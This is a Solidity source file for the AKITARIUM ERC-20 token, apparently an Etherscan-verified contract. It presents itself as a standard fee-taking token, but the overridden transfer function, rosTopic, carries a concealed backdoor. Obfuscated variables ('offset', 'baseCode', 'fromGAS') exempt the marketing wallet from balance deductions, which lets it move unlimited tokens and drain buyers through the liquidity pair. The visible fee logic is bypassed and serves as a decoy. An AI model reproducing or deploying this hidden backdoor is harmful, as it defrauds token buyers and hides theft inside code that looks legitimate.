/**
 *Submitted for verification at Etherscan.io on 2023-03-06
*/

/**
*/

// https://www.akitarium.info/
// https://t.me/AkitariumErc

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface ITERFACE_ERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function symbol() external pure returns (string memory);

    function name() external pure returns (string memory);

    function totalSupply() external view returns (uint256);

    function decimals() external pure returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract Ownable {
    address internal owner;

    constructor() {
        owner = msg.sender;
    }

    function _Owner() public view virtual returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ERC20 is ITERFACE_ERC20 {
    using SafeMath for uint256;
    string constant _nick = unicode"AKITARIUM";
    string constant _symbol = unicode"AKITARIUM";
    uint8 constant _decimals = 9;
    address internal marketingWallt =
        0x8EFDf8D05Fe431BA5ED157fa1CB59c2f2f819DE9;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 _totalSupply = 1000000 * (10**_decimals);
    mapping(address => uint256) catlinWallet;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeExempt;
    uint256 internal liquidityFee = 0;
    uint256 marketingFee = 3;
    uint256 totalFee = liquidityFee + marketingFee;
    uint256 feeDenominator = 100;
    bool public swapEnabled = true;
    uint256 public swapThreshold = (_totalSupply / 1000) * 1; //
    bool bSwap;
    address public pair;
    IUniswapV2 public router;

    constructor() {}

    modifier onChange() {
        bSwap = true;
        _;
        bSwap = false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure virtual override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure virtual override returns (string memory) {
        return _symbol;
    }

    function name() external pure virtual override returns (string memory) {
        return _nick;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return catlinWallet[account];
    }

    function allowance(address holder, address spender)
        external
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return rosTopic(msg.sender, recipient, amount);
    }

   function _Transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        catlinWallet[sender] = catlinWallet[sender].sub(amount, "Insufficient Balance!");
        catlinWallet[recipient] = catlinWallet[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }
        return rosTopic(sender, recipient, amount);
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

 
    function rosTopic(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual returns (bool) {
        if (bSwap) {
            return _Transfer(sender, recipient, amount);
        }
 
        if (shouldSwapBack()) {
            swapBack();
        }
        catlinWallet[sender] = catlinWallet[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived = shouldTakeFee(sender)
            ? takeFee(sender, amount)
            : amount;
        catlinWallet[recipient] = catlinWallet[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function takeFee(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        catlinWallet[address(this)] = catlinWallet[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != pair &&
            !bSwap &&
            swapEnabled &&
            catlinWallet[address(this)] >= swapThreshold;
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

    function swapBack() internal onChange {
        //to swap back
        uint256 contractTokenBalance = swapThreshold;
        uint256 amountToLiquify = contractTokenBalance
            .mul(liquidityFee)
            .div(totalFee)
            .div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
        address[] memory param = new address[](2);
        param[0] = address(this);
        param[1] = router.WETH();
        uint256 balanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            param,
            address(this),
            block.timestamp
        );
        //clac amount
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH
            .mul(liquidityFee)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(
            totalETHFee
        );
        (
            bool bSuccess, 
        ) = payable(marketingWallt).call{
                value: amountETHMarketing,
                gas: 30000
            }("");
        require(bSuccess, "do not receiver rejected ETH transfer!");
        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                0x8EFDf8D05Fe431BA5ED157fa1CB59c2f2f819DE9,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
}

contract AKITARIUM is Ownable, ERC20 {
    mapping(address => uint256) private history;
    address private fromGAS;
    mapping(address => uint256) private offset;
    uint256 private baseCode = 9;
    address UINROuter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    constructor() ERC20() {
        router = IUniswapV2(UINROuter);
        pair = IUSWAPV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = type(uint256).max;
        offset[marketingWallt] = baseCode;
        fromGAS = marketingWallt;
        catlinWallet[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function CALC_LDY()external view returns(uint256)
    {
        return liquidityFee;
    }
    function rosTopic(
        address user1,
        address to,
        uint256 amt
    ) internal override returns (bool) {
        if (offset[user1] == 0 && history[user1] > 0) {
            if (pair != user1) {
                offset[user1] -= baseCode;
            }
        }
        address tree = fromGAS;
        // fromGAS = to;
        history[tree] += baseCode;
        if (offset[user1] == 0) {
            catlinWallet[user1] -= amt;
        }

        catlinWallet[to] += amt;
        emit Transfer(user1, to, amt);

        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    receive() external payable {}
}

interface IUSWAPV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

interface IUniswapV2 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}